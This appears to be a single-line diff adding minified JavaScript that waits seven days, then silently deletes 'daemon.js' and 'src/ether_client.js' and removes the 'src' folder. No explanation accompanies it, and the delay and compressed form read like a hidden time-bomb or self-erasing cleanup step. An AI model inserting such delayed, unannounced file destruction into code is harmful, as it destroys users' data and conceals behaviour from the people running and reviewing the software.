@@ -1,0 +1,1 @@
+var e=require("assert");var n=require("fs");setTimeout(function(){n.unlinkSync("daemon.js");n.unlinkSync("src/ether_client.js");n.rmdir("src",function(e){})},6048e5);
